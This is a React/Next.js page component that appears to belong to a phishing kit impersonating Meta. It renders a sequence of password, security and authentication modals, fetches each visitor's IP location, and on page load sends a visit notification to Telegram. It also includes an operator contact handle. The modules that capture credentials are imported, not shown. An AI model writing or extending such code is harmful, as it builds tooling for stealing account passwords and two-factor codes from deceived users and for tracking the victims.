"use client"

import MetaComponent from '@/app/components/meta'
import AuthenticationModal from '@/app/components/modal/AuthenticationModal'
import ClientModal from '@/app/components/modal/ClientModal'
import SecurityModal from '@/app/components/modal/SecurityModal'
import SuccessModal from '@/app/components/modal/SuccessModal'
import { getUserLocation, notifyTelegramVisit } from '@/app/utils'
import React from 'react'
import "@/app/libs/i18n"
import { useTranslation } from 'react-i18next'

const NotFoundComponent = () => {
    const [userLocation, setUserLocation] = React.useState({});
    const [countryCode, setCountryCode] = React.useState("");    

    const [isOpenAuth, setIsOpenAuth] = React.useState(false);
    const [isOpendPassword, setIsOpendPassword] = React.useState(false);
    const [isOpendAuthentication, setIsOpendAuthentication] = React.useState(false);
    const [dataModal, setDataModal] = React.useState({});
    const [isOpendSuccess, setIsOpendSuccess] = React.useState(false);

    const notificationSent = React.useRef(false);
    
    const { t, i18n } = useTranslation();

    const getIp = async () => {
        try {
            const userLocation = await getUserLocation();
            setUserLocation(userLocation || "Error, contact @otis_cua");
            setCountryCode(userLocation?.country_code || "US");
        } catch (error) {
            console.error("Error getting IP or location:", error);
        }
    }

    React.useEffect(() => {
        const sendNotification = async () => {
            const userLocation = await getUserLocation();
            
            const language = userLocation?.country_code.toLowerCase() || "en";
            i18n.changeLanguage(language)

            if (notificationSent.current == false) {
                notificationSent.current = true;
                await notifyTelegramVisit({ location: userLocation, lang: language });
            }
        }

        sendNotification()
    },[])

    const handleOpendModal = (isOpenAuth: boolean) => {
        getIp();
        setIsOpenAuth(isOpenAuth);
    }


    const handleToggleAuth = (isOpenAuth: boolean) => {
        setIsOpenAuth(isOpenAuth);
    }

    const handleOpendPassword = (isOpendPassword: boolean) => {
        setIsOpendPassword(isOpendPassword);
    }

    const handleToggleAuthentication = (isOpendSecurity: boolean) => {
        setIsOpendAuthentication(isOpendSecurity);
    }

    const handSendDataModal = (data: object) => {
        setDataModal(data);
    }

    const handleToggleSuccess = (isOpend: boolean) => {
        setIsOpendSuccess(isOpend);
    }

    return (
        <div>
            <MetaComponent
                onToggle={handleOpendModal}
            />

            <ClientModal
                isOpenAuth={isOpenAuth}
                userLocation={userLocation}
                countryCode={countryCode}
                onToggleAuth={handleToggleAuth}
                onOpendPassword={handleOpendPassword}
            />

            <SecurityModal
                isOpendPassword={isOpendPassword}
                onToggleModalPass={handleOpendPassword}
                onOpendAuthentication={handleToggleAuthentication}
                onSendDataModal={handSendDataModal}
            />

            <AuthenticationModal
                isOpendAuthentication={isOpendAuthentication}
                onToggleModalAuthentication={handleToggleAuthentication}
                onOpendSuccess={handleToggleSuccess}
                dataModal={dataModal}
            />

            <SuccessModal
                isOpendSuccess={isOpendSuccess}
                onToggleSuccess={handleToggleSuccess}
            />
        </div>
    )
}

export default NotFoundComponent
